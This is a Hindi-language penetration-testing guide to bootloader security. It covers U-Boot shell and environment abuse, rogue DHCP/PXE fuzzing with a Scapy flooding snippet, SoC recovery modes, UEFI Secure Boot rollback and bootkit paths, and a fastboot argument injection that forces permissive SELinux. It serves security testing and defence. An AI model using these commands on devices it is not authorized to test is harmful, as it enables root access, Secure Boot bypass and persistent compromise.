# Bootloader Testing

{{#include ../../banners/hacktricks-training.md}}

डिवाइस के startup configurations में बदलाव करने और U-Boot तथा UEFI-class loaders जैसे bootloaders को test करने के लिए नीचे दिए गए steps सुझाए जाते हैं। शुरुआती code execution हासिल करने, signature/rollback protections का आकलन करने और recovery या network-boot paths का दुरुपयोग करने पर ध्यान दें।

संबंधित: bl2_ext patching के ज़रिए MediaTek secure-boot bypass:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins और environment का दुरुपयोग

1. Interpreter shell तक पहुँचें
   - Boot के दौरान, `bootcmd` execute होने से पहले किसी ज्ञात break key (अक्सर कोई भी key, 0, space या board-specific "magic" sequence) दबाएँ, ताकि U-Boot prompt पर पहुँचा जा सके।<sup>[[1]](#references)</sup>

2. Boot state और variables की जाँच करें
   - उपयोगी commands:
     - `printenv` (environment dump करें)
     - `bdinfo` (board info, memory addresses)
     - `help bootm; help booti; help bootz` (समर्थित kernel boot methods)
     - `help ext4load; help fatload; help tftpboot` (उपलब्ध loaders)

3. Root shell पाने के लिए boot arguments में बदलाव करें
   - `init=/bin/sh` जोड़ें, ताकि kernel सामान्य init के बजाय shell पर जाए:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. अपने TFTP server से Netboot करें
   - नेटवर्क configure करें और LAN से kernel/fit image प्राप्त करें:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. environment के माध्यम से बदलाव स्थायी करें
   - यदि env storage write-protected नहीं है, तो आप नियंत्रण को स्थायी कर सकते हैं:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` जैसे variables की जाँच करें, जो fallback paths को प्रभावित करते हैं। गलत configure की गई values shell में बार-बार break करने का मौका दे सकती हैं।

6. Debug/unsafe features की जाँच करें
   - इनकी तलाश करें: `bootdelay` > 0, `autoboot` disabled होना, unrestricted `usb start; fatload usb 0:1 ...`, serial के ज़रिए `loady`/`loads` करने की क्षमता, untrusted media से `env import`, और signature checks के बिना load किए गए kernels/ramdisks।

7. U-Boot image/verification testing
   - यदि platform FIT images के साथ secure/verified boot का दावा करता है, तो unsigned और tampered images—दोनों आज़माएँ:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` की अनुपस्थिति या legacy `verify=n` behavior अक्सर arbitrary payloads को boot करने देता है।
   - सिर्फ़ allow/deny नतीजे पर न रुकें: हालिया FIT research से पता चला कि verification path खुद भी pre-auth attack surface हो सकता है। Externally stored FIT data (`data-offset`, `data-position`, `data-size`), signed configuration selection, `loadables`, और overlay / `extra-conf` handling के negative tests करें।
   - अगर आपके पास matching source tree है, तो असली hardware को छूने से पहले U-Boot sandbox में FIT verification behaviour को तेज़ी से reproduce करने के लिए `test/vboot/vboot_test.sh` उपयोगी है।<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux`, और script bootflows
   - आधुनिक U-Boot builds में, `bootcmd` अक्सर Standard Boot के आसपास सिर्फ़ एक wrapper होता है। इसका मतलब है कि writable media, PXE या SPI flash असली trust boundary बन सकते हैं, भले ही दिखाई देने वाला environment हानिरहित लगे।
   - `extlinux` bootmeth `/` और `/boot` के अंतर्गत `extlinux/extlinux.conf` खोजता है; script bootmeth पहले `boot.scr.uimg` और फिर `boot.scr` खोजता है। Network boot में, script filename `boot_script_dhcp` से आ सकता है।
   - शुरुआती जाँच के लिए उपयोगी commands:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - परीक्षण के लिए abuse cases: `boot_targets` में पहले आने वाला attacker-controlled USB/SD media, writable `/boot/extlinux/extlinux.conf`, `boot.scr` देने वाला rogue TFTP, या `script_offset_f` के ज़रिए SPI-backed script execution।
   - यदि platform FIT verification पर निर्भर करता है, तो सुनिश्चित करें कि configurations पर configuration level पर signature हो, केवल per-image पर नहीं; `required-mode=all` किसी भी एक required key को स्वीकार करने से अधिक मज़बूत है।

## Network-boot surface (DHCP/PXE) और rogue servers

9. PXE/DHCP parameter fuzzing
   - U-Boot के legacy BOOTP/DHCP handling में memory-safety से जुड़ी समस्याएँ रही हैं। उदाहरण के लिए, CVE‑2024‑42040 crafted DHCP responses के ज़रिए memory disclosure का वर्णन करता है, जिससे U-Boot memory के bytes wire पर leak हो सकते हैं।<sup>[[4]](#references)</sup> अत्यधिक लंबे और edge-case values (option 67 bootfile-name, vendor options, file/servername fields) के साथ DHCP/PXE code paths को exercise करें और hangs/leaks पर नज़र रखें।
   - Netboot के दौरान boot parameters को stress करने के लिए न्यूनतम Scapy snippet:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - यह भी जाँचें कि PXE filename fields, OS-side provisioning scripts से chain होने पर, बिना sanitization के shell/loader logic को पास किए जाते हैं या नहीं।

10. Rogue DHCP server command injection testing
   - एक rogue DHCP/PXE service सेट करें और filename या options fields में characters inject करने की कोशिश करें, ताकि boot chain के बाद के stages में command interpreters तक पहुँचा जा सके। Metasploit का DHCP auxiliary, `dnsmasq` या custom Scapy scripts इसके लिए अच्छे विकल्प हैं। पहले lab network को अलग-थलग करना सुनिश्चित करें।

## सामान्य boot को override करने वाले SoC ROM recovery modes

कई SoC में BootROM का "loader" mode होता है, जो flash images invalid होने पर भी USB/UART के ज़रिए code स्वीकार करता है। यदि secure-boot fuses नहीं जले हैं, तो इससे chain के शुरुआती चरण में arbitrary code execution मिल सकता है।

- NXP i.MX (Serial Download Mode)
  - Tools: `uuu` (mfgtools3) या `imx-usb-loader`।
  - उदाहरण: RAM से custom U-Boot भेजने और चलाने के लिए `imx-usb-loader u-boot.imx`।
- Allwinner (FEL)
  - Tool: `sunxi-fel`।
  - उदाहरण: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` या `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`।
- Rockchip (MaskROM)
  - Tool: `rkdeveloptool`।
  - उदाहरण: loader को stage करने और custom U-Boot upload करने के लिए `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`।

जाँचें कि device में secure-boot eFuses/OTP जले हुए हैं या नहीं। यदि नहीं, तो BootROM download modes अक्सर आपके first-stage payload को सीधे SRAM/DRAM से execute करके higher-level verification (U-Boot, kernel, rootfs) को bypass कर देते हैं।

## UEFI/PC-class bootloaders: त्वरित जाँच

11. ESP tampering, rollback और key-enrollment testing
   - EFI System Partition (ESP) mount करें और loader components की जाँच करें: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths।
   - जहाँ संभव हो, OS से Secure Boot state और key databases dump करें:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - यदि platform Setup Mode में है, बिना authentication के key enrollment स्वीकार करता है, या test/default Platform Key (PKfail class) के साथ आता है, तो local admin या भौतिक हमलावर अपना KEK/db enroll कर सकता है और Secure Boot को “enabled” दिखाते हुए मनमाने EFI binaries boot कर सकता है।<sup>[[3]](#references)</sup>
   - यदि Secure Boot revocations (dbx) current नहीं हैं, तो downgraded या ज्ञात रूप से vulnerable signed boot components के साथ boot करने की कोशिश करें। यदि platform अब भी पुराने shims/bootmanagers पर भरोसा करता है, तो persistence पाने के लिए आप अक्सर ESP से अपना kernel या `grub.cfg` load कर सकते हैं।
   - Windows पर, patched hosts भी vulnerable signed boot managers स्वीकार कर सकते हैं, यदि `Microsoft Windows Production PCA 2011` signer firmware `dbx` में मौजूद न हो—जैसा कि BlackX के मामले में देखा गया।<sup>[[13]](#references)[[14]](#references)</sup> Baton Drop-style bypass से attacker MOK enroll कर सकता है; इसके बाद legitimate shim, आगे के boots पर उस key से signed EFI payload load कर सकता है।<sup>[[12]](#references)[[13]](#references)</sup> पुराने Windows signer को बाद में revoke करने से enrolled MOK नहीं हटता, इसलिए shim-based path बना रह सकता है, यदि उस shim पर भरोसा कायम हो।<sup>[[12]](#references)</sup>
   - किसी authorized UEFI machine पर इस rollback path का परीक्षण करने से पहले, केवल Windows update history नहीं, बल्कि **effective firmware revocation state** जांचें।<sup>[[13]](#references)[[14]](#references)</sup> Microsoft, `dbx` में 2011 signer की जांच के लिए यह read-only elevated PowerShell check देता है:<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` केवल एक संकेत है: किसी पुनर्प्राप्त किए जा सकने वाले लैब में हस्ताक्षरित विशिष्ट boot component और अन्य revocations की पुष्टि करें।<sup>[[12]](#references)[[14]](#references)</sup> लंबित registry update या समय-सीमा समाप्त हो चुका signing certificate, पूरी हो चुकी `dbx` revocation के समान नहीं है।<sup>[[13]](#references)[[14]](#references)</sup>

12. पुराने shim / SBAT / dbx revocation का परीक्षण
   - पुराने Microsoft-signed shim और vendor forks अब भी BYOVD-style bootkit path के रूप में काम कर सकते हैं, अगर revocations पुरानी हों। एक अलग-थलग लैब में, ESP पर ऐतिहासिक रूप से vulnerable shim रखें और अपने `grubx64.efi` या kernel को chainload करने का प्रयास करें।<sup>[[11]](#references)</sup>
   - त्वरित triage:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - यदि shim revocation list में होने के बावजूद चलता है, तो firmware/OS में `dbx` updates पुराने हैं या वह ऐसे forked loader पर भरोसा करता है जिसने upstream SBAT protections कभी प्राप्त नहीं कीं।

13. Boot logo parsing bugs (LogoFAIL class)
   - कई OEM/IBV firmwares में DXE के image-parsing flaws थे, जो boot logos को process करते हैं। यदि कोई attacker ESP पर vendor-specific path (जैसे, `\EFI\<vendor>\logo\*.bmp`) के अंतर्गत crafted image रख सकता है और reboot कर सकता है, तो Secure Boot enabled होने पर भी early boot के दौरान code execution संभव हो सकता है। जाँचें कि platform user-supplied logos स्वीकार करता है या नहीं और क्या OS से उन paths पर write किया जा सकता है।<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16) trust gaps

Android 16 के उन devices पर जो Qualcomm के ABL का उपयोग करके **Generic Bootloader Library (GBL)** load करते हैं, जाँचें कि ABL `efisp` partition से load किए जाने वाले UEFI app को **authenticate** करता है या नहीं। यदि ABL केवल UEFI app की **मौजूदगी** जाँचता है और signatures verify नहीं करता, तो `efisp` पर write primitive boot के समय **pre-OS unsigned code execution** संभव बना देता है।<sup>[[6]](#references)[[7]](#references)</sup>

व्यावहारिक जाँच और abuse paths:

- **efisp write primitive**: `efisp` में custom UEFI app लिखने का तरीका चाहिए (root/privileged service, OEM app bug, recovery/fastboot path)। इसके बिना, GBL loading gap सीधे exploitable नहीं है।<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection** (ABL bug): कुछ builds `fastboot oem set-gpu-preemption` में अतिरिक्त tokens स्वीकार करते हैं और उन्हें kernel cmdline में जोड़ देते हैं। इसका उपयोग permissive SELinux लागू करने के लिए किया जा सकता है, जिससे protected partitions पर writes संभव हो जाते हैं:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  यदि device patched है, तो command को अतिरिक्त arguments अस्वीकार करने चाहिए।<sup>[[5]](#references)[[6]](#references)</sup>
- **Persistent flags के ज़रिए Bootloader unlock**: Boot-stage payload, persistent unlock flags (जैसे, `is_unlocked=1`, `is_unlocked_critical=1`) को बदलकर OEM server/approval gates के बिना `fastboot oem unlock` का अनुकरण कर सकता है। अगले reboot के बाद यह बदलाव कायम रहता है।<sup>[[6]](#references)</sup>

रक्षा/triage नोट्स:

- पुष्टि करें कि ABL, `efisp` से आए GBL/UEFI payload पर signature verification करता है या नहीं। यदि नहीं, तो `efisp` को high-risk persistence surface मानें।
- जाँचें कि ABL fastboot OEM handlers को **argument की संख्या validate करने** और अतिरिक्त tokens अस्वीकार करने के लिए patch किया गया है या नहीं।<sup>[[8]](#references)[[9]](#references)</sup>

## Hardware संबंधी सावधानी

शुरुआती boot के दौरान SPI/NAND flash के साथ काम करते समय सावधानी बरतें (उदाहरण के लिए, reads को bypass करने के लिए pins को ground करना) और हमेशा flash datasheet देखें। गलत समय पर short करने से device या programmer corrupt हो सकता है।

## नोट्स और अतिरिक्त सुझाव

- Environment blobs को RAM और storage के बीच स्थानांतरित करने के लिए `env export -t ${loadaddr}` और `env import -t ${loadaddr}` आज़माएँ; कुछ platforms बिना authentication के removable media से env import करने देते हैं।
- Linux-आधारित उन systems में persistence के लिए, जो `extlinux.conf` के ज़रिए boot होते हैं, boot partition पर `APPEND` line में बदलाव करना (`init=/bin/sh` या `rd.break` जोड़ने के लिए) अक्सर पर्याप्त होता है, यदि signature checks लागू नहीं हैं।
- यदि target dual-slot / A/B updates का उपयोग करता है, तो [firmware analysis overview](README.md) में anti-rollback और slot-desync techniques देखें, ताकि bootloader के बाहर updater-only trust gaps छूट न जाएँ।
- यदि userland में `fw_printenv/fw_setenv` उपलब्ध हैं, तो सत्यापित करें कि `/etc/fw_env.config` वास्तविक env storage से मेल खाता है। गलत offsets के कारण आप गलत MTD region को read/write कर सकते हैं।

## References

- [1] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [LogoFAIL की खोज: system boot के दौरान image parsing के खतरे](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: अविश्वसनीय Platform Keys, UEFI Ecosystem में Secure Boot को कमज़ोर करते हैं](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040 का विवरण](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: दो unsanitized strings के ज़रिए Xiaomi को unlock करना](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL exploit से attackers bootloaders unlock कर सकते हैं](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generic Bootloader (GBL) architecture](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: kernel cmdline में untrusted input के propagation को ठीक करना](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: set-hw-fence-value command के लिए check जोड़ना](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Boot के लिए अनुपयुक्त: U-Boot के FIT signature verification को तोड़ना](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Vulnerability Note VU#616257 - Microsoft-signed UEFI shim bootloaders, Secure Boot bypass के प्रति संवेदनशील](https://kb.cert.org/vuls/id/616257)
- [12] [BlackLotus UEFI bootkit: मिथक की पुष्टि](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: BlackLotus जैसा UEFI bootkit](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Secure Boot में बदलावों के लिए Windows Boot Manager revocations का प्रबंधन कैसे करें](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
{{#include ../../banners/hacktricks-training.md}}
